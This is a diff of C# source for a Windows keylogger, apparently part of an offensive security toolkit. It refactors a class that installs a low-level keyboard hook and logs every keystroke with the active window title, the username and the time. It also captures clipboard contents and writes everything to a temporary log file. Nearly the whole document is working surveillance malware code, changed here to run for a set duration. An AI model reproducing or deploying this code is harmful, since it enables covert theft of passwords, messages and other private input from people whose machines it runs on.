@@ -6,14 +6,19 @@
     using System.Runtime.InteropServices;
     using System.Text;
     using System.Threading;
-    using System.Threading.Tasks;
     using System.Windows.Forms;
 
     public class Keyboard
     {
-        public static string logName = Helpers.CreateTempFileName(".log", "keylogger-", "keylogger");
-        public static string lastTitle = "";
-        public static string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+        public Keyboard(string logFilename = default)
+        {
+            //Logname = logFilename ?? Helpers.CreateTempFileName(".log", "keylogger-", "keylogger");
+            Logname = Helpers.CreateTempFileName(".log", "keylogger-", "keylogger");
+        }
+
+        public string LastTitle { get; set; } = string.Empty;
+
+        public string Logname { get; private set; }
 
         [DllImport("kernel32.dll")]
         public static extern IntPtr GetModuleHandle(string lpModuleName);
@@ -803,7 +808,7 @@
             CTLCOLORSCROLLBAR = 0x0137,
 
             /// <summary>
-            /// A static control, or an edit control that is read-only or disabled, sends the WM_CTLCOLORSTATIC message to its parent window when the control is about to be drawn. By responding to this message, the parent window can use the specified device context handle to set the text and background colors of the static control.
+            /// A control, or an edit control that is read-only or disabled, sends the WM_CTLCOLORSTATIC message to its parent window when the control is about to be drawn. By responding to this message, the parent window can use the specified device context handle to set the text and background colors of the control.
             /// </summary>
             CTLCOLORSTATIC = 0x0138,
 
@@ -1321,7 +1326,7 @@
             HSHELL_WINDOWREPLACED = 13
         }
 
-        private static IntPtr CallbackFunction(Int32 code, IntPtr wParam, IntPtr lParam)
+        private IntPtr CallbackFunction(Int32 code, IntPtr wParam, IntPtr lParam)
         {
             try
             {
@@ -1762,27 +1767,21 @@
                     props["Key"] = key;
                     props["Time"] = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss tt");
                     props["Window"] = title.ToString();
-                    if (props["Window"] != Keyboard.lastTitle)
+                    if (props["Window"] != LastTitle)
                     {
-                        string titleString = "User    : " + Keyboard.userName + Environment.NewLine +
+                        string titleString = "User    : " + Helpers.Username + Environment.NewLine +
                                                 "Window  : " + props["Window"] + Environment.NewLine +
                                                 "Time    : " + props["Time"] + Environment.NewLine +
-                                                "LogFile : " + Keyboard.logName + Environment.NewLine +
+                                                "LogFile : " + Logname + Environment.NewLine +
                                                 "----------------------------------------------";
-                        //Console.WriteLine();
-                        //Console.WriteLine();
-                        //Console.WriteLine(titleString);
-                        //Console.WriteLine();
                         Trace.WriteLine("");
                         Trace.WriteLine("");
                         Trace.WriteLine(titleString);
                         Trace.WriteLine("");
                         // Write to file
-                        Keyboard.lastTitle = props["Window"];
+                        LastTitle = props["Window"];
                     }
-                    //Console.Write(props["Key"]);
                     Trace.Write(props["Key"]);
-                    // log to file here
                 }
             }
             catch (Exception ex)
@@ -1793,7 +1792,7 @@
             return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
         }
 
-        private static void BootClipboard()
+        private void BootClipboard()
         {
             Application.Run(new ClipboardNotification.NotificationForm());
         }
@@ -1880,11 +1879,11 @@
                                 //Write to stdout clipboard contents
                                 try
                                 {
-                                    Trace.WriteLine("\t[cntrl-C] Clipboard Copied: " + Clipboard.GetText());
+                                    Trace.WriteLine($"\tClipboard Copied:\n\t----- START -----\n{Clipboard.GetText()}\n\t----- END -----");
                                 }
                                 catch (Exception ex)
                                 {
-                                    Trace.WriteLine("\t[Error] Couldn't get text from clipboard.");
+                                    Trace.WriteLine($"\t[Error] Couldn't get text from clipboard. {ex.Message}");
                                 }
                             }
                         }
@@ -1900,89 +1899,65 @@
             }
         }
 
-        public static void StartKeylogger()
+        public void StartKeylogger(TimeSpan duration = default)
         {
             Console.WriteLine("Starting keylogger...");
             try
             {
                 Trace.Listeners.Clear();
-                TextWriterTraceListener twtl = new TextWriterTraceListener(Keyboard.logName);
-                twtl.Name = "TextLogger";
-                twtl.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;
-
-                ConsoleTraceListener ctl = new ConsoleTraceListener(false);
-                ctl.TraceOutputOptions = TraceOptions.DateTime;
-
-                Trace.Listeners.Add(twtl);
-                Trace.Listeners.Add(ctl);
-                Trace.AutoFlush = true;
-
-                // Start the clipboard
-                ThreadStart clipboardThreadStart = new ThreadStart(BootClipboard);
-                Thread clipboardThread = new Thread(clipboardThreadStart);
-                clipboardThread.Start();
-                //Application.Run(new ClipboardNotification.NotificationForm());
-                HookProc callback = CallbackFunction;
-                var module = Process.GetCurrentProcess().MainModule.ModuleName;
-                var moduleHandle = GetModuleHandle(module);
-                var hook = SetWindowsHookEx(HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);
-
-                while (true)
+                using (var twtl = new TextWriterTraceListener(Logname))
                 {
-                    PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
-                    System.Threading.Thread.Sleep(5);
+                    twtl.Name = "TextLogger";
+                    twtl.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;
+
+                    using (var ctl = new ConsoleTraceListener(false))
+                    {
+                        ctl.TraceOutputOptions = TraceOptions.DateTime;
+
+                        Trace.Listeners.Add(twtl);
+                        Trace.Listeners.Add(ctl);
+                        Trace.AutoFlush = true;
+
+                        // Start the clipboard
+                        var clipboardThreadStart = new ThreadStart(BootClipboard);
+                        var clipboardThread = new Thread(clipboardThreadStart);
+                        clipboardThread.Start();
+                        //Application.Run(new ClipboardNotification.NotificationForm());
+                        HookProc callback = CallbackFunction;
+                        var module = Process.GetCurrentProcess().MainModule.ModuleName;
+                        var moduleHandle = GetModuleHandle(module);
+                        var hook = SetWindowsHookEx(HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);
+
+                        if (duration != default)
+                        {
+                            var expiration = DateTime.Now.Add(duration);
+
+                            while (DateTime.Now < expiration)
+                            {
+                                PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
+                                Thread.Sleep(5);
+                            }
+                        }
+                        else
+                        {
+                            while (true)
+                            {
+                                PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
+                                Thread.Sleep(5);
+                            }
+                        }
+
+                        Trace.Listeners.Remove(twtl);
+                        Trace.Listeners.Remove(ctl);
+                    }
                 }
             }
             catch (Exception ex)
             {
                 Console.WriteLine("[X] Exception: {0}", ex.Message);
                 Console.WriteLine("[X] Stack Trace: {0}", ex.StackTrace);
-                Console.WriteLine("\n[*] Log name for last session: {0}", Keyboard.logName);
+                Console.WriteLine("\n[*] Log name for last session: {0}", Logname);
             }
         }
-
-        public static Task StartKeyloggerAsync(CancellationToken cancellationToken) =>
-            Task.Factory.StartNew(() => StartKeylogger(), cancellationToken);
-
-        //{
-        //    Console.WriteLine("Starting keylogger...");
-
-        //    try
-        //    {
-        //        Trace.Listeners.Clear();
-        //        TextWriterTraceListener twtl = new TextWriterTraceListener(Keyboard.logName);
-        //        twtl.Name = "TextLogger";
-        //        twtl.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;
-
-        //        ConsoleTraceListener ctl = new ConsoleTraceListener(false);
-        //        ctl.TraceOutputOptions = TraceOptions.DateTime;
-
-        //        Trace.Listeners.Add(twtl);
-        //        Trace.Listeners.Add(ctl);
-        //        Trace.AutoFlush = true;
-
-        //        // Start the clipboard
-        //        ThreadStart clipboardThreadStart = new ThreadStart(BootClipboard);
-        //        Thread clipboardThread = new Thread(clipboardThreadStart);
-        //        clipboardThread.Start();
-        //        //Application.Run(new ClipboardNotification.NotificationForm());
-        //        HookProc callback = CallbackFunction;
-        //        var module = Process.GetCurrentProcess().MainModule.ModuleName;
-        //        var moduleHandle = GetModuleHandle(module);
-        //        var hook = SetWindowsHookEx(HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);
-
-        //        while (cancellationToken.IsCancellationRequested == false)
-        //        {
-        //            PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
-        //            await Task.Delay(5);
-        //        }
-        //    }
-        //    catch (Exception ex)
-        //    {
-        //        Console.WriteLine("[X] Exception: {0}", ex.Message);
-        //        Console.WriteLine("[X] Stack Trace: {0}", ex.StackTrace);
-        //        Console.WriteLine("\n[*] Log name for last session: {0}", Keyboard.logName);
-        //    }
-        //}
     }
 }
